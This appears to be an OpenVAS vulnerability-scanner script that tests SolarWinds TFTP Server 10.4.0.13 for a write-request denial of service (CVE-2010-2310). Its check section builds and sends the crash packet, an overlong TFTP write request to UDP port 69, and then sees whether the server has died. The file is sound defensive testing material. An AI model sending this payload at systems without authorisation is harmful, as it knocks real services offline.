###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_solarwinds_tftp_server_dos_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# SolarWinds TFTP Server Write Request Denial Of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to crash the server process,
  resulting in a denial-of-service condition.
  Impact Level: Application";
tag_affected = "SolarWinds TFTP Server 10.4.0.13";
tag_insight = "The flaw is caused by an error when processing TFTP write requests,
  which can be exploited to crash the server via a specially crafted
  request sent to UDP port 69.";
tag_solution = "No solution or patch is available as of 17th June, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.solarwinds.com/downloads/";
tag_summary = "This host is running SolarWinds TFTP Server and is prone to
  denial of service vulnerability.";

if(description)
{
  script_id(901124);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-06-22 13:34:32 +0200 (Tue, 22 Jun 2010)");
  script_cve_id("CVE-2010-2310");
  script_bugtraq_id(40824);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("SolarWinds TFTP Server Write Request Denial Of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/13836");

  script_description(desc);
  script_summary("Determine if SolarWinds TFTP Server is prone to a denial-of-service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl");
  script_require_ports("Services/udp/tftp");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("tftp.inc");

## Not a Safe Check, exit
if(safe_checks()){
  exit(0);
}

## Get TFTP Port
port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## Check TFTP Port Status
if(tftp_alive(port:port))
{
  ## Open UDP Socket
  sock = open_sock_udp(port);
  if(!sock){
    exit(0);
  }

  ## Building Crash
  crash = raw_string(0x00,0x02) + crap(1000) + raw_string(0x00) +
          "NETASCII" + raw_string(0x00);
  ## Sending Crash
  send(socket:sock, data:crash);
  ## Close UDP Socket
  close(sock);

  ## Check TFTP Port Status
  if(!tftp_alive(port:port))
  {
    security_warning(port:port,proto:"udp");
    exit(0);
  }
}

